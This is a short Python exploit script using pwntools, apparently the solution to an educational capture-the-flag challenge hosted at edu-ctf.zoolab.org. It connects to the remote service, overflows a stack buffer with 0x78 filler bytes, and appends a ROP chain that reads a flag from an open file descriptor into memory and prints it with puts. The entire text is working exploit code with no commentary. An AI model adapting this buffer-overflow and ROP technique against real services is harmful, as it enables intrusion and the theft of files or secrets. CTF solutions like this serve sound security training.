from pwn import *

context.terminal = ['tmux', 'split', '-h']
context.arch = 'amd64'

p = remote("edu-ctf.zoolab.org", 30212)

p.sendafter("Hello, world !", b"\xFF")

flag_buf = 0x404500
puts_addr = 0x401080
flush_addr = 0x4010A0
read_addr = 0x401090

pop_rdi_ret = 0x4013a3
pop_rsi_pop_r15_ret = 0x4013a1

ROP = flat(
    pop_rdi_ret, 3,
    pop_rsi_pop_r15_ret, flag_buf, 0xdeadbeef,
    read_addr,

    pop_rdi_ret, flag_buf,
    puts_addr,
    
    pop_rdi_ret, 0,
    flush_addr
)

p.send(b"A"*0x78 + ROP)

p.interactive()